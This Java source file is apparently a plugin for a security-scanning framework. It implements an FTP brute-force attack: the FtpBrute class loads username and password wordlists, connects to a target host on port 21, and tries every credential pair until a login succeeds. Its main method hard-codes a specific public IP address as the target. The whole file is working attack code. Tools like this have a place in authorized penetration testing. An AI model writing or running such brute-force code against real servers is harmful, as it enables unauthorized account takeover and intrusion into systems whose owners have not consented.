package cn.com.sgcc.marki_with_maven.modules;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.net.ftp.FTPClient;

public class FtpBrute implements IPocBase {

	@Override
	public Map info() {
		// TODO Auto-generated method stub
		Map info = new HashMap<String, Object>();
		info.put("name", "FtpBrute");
		HashMap<String, Object> configurable_para = new HashMap<String, Object>() {
			{
				put("user_names", new File("data/ftp-username.txt"));
				put("passwords", new File("data/ftp-password.txt"));
			}
		};
		info.put("configurable_para_special", configurable_para);
		return info;
	}

	@Override
	public boolean match(Map infodict) {
		// TODO Auto-generated method stub
		boolean ismatch = false;
		String ip = (String) infodict.get("ip");
		String port = (String) infodict.get("port");
		String serviceType = (String) infodict.get("service_type");
		String serviceVersion = (String) infodict.get("service_version");
		if (serviceType.toLowerCase().contains("ftp") || Integer.valueOf(port) == 21) {
			ismatch = true;
		}
		return ismatch;
	}

	@Override
	public boolean verify(Map infodict) {
		// TODO Auto-generated method stub
		String ip = (String) IPocBase.Utils.getParameter(infodict, "ip");
		String port = (String) IPocBase.Utils.getParameter(infodict, "port");
		String serviceType = (String) IPocBase.Utils.getParameter(infodict, "service_type");
		String serviceVersion = (String) IPocBase.Utils.getParameter(infodict, "service_version");
		boolean success = false;
		FTPClient ftpClient = new FTPClient();
		try {
			BufferedReader brUserName = new BufferedReader(infodict.get("config_user_names") == null
					? new InputStreamReader(new FileInputStream(new File("data/ftp-username.txt")))
					: (StringReader) infodict.get("config_user_names"));
			BufferedReader brPassWord = new BufferedReader(infodict.get("config_passwords") == null
					? new InputStreamReader(new FileInputStream(new File("data/ftp-password.txt")))
					: (StringReader) infodict.get("config_passwords"));
			ArrayList<String> userNames = new ArrayList<String>();
			ArrayList<String> passWords = new ArrayList<String>();
			String tmpuserName = "";
			String tmppassWord = "";
			while ((tmpuserName = brUserName.readLine()) != null) {
				userNames.add(tmpuserName);
			}
			while ((tmppassWord = brPassWord.readLine()) != null) {
				passWords.add(tmppassWord);
			}

			boolean isBreak = false;
			for (String userName : userNames) {
				if (isBreak)
					break;
				for (String passWord : passWords) {
					if (infodict.get("outputStream") != null)
						((ByteArrayOutputStream) infodict.get("outputStream"))
								.write((String.format("Testing FTP %s,%s", userName, passWord)).getBytes());
					ftpClient.connect(ip, Integer.valueOf(port));
					if (ftpClient.login(userName, passWord)) {
						success = true;
						isBreak = true;
						break;
					}
				}
			}

		} catch (Exception e) {
			;
		} finally {
			if (ftpClient.isConnected()) {
				try {
					ftpClient.disconnect();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		return success;
	}

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		Map infodict = new HashMap<String, String>();
		infodict.put("ip", "74.207.251.51");
		infodict.put("port", "21");
		infodict.put("service_type", "ftp");
		infodict.put("service_version", "ftp");
		System.out.println(new FtpBrute().verify(infodict));
	}
}
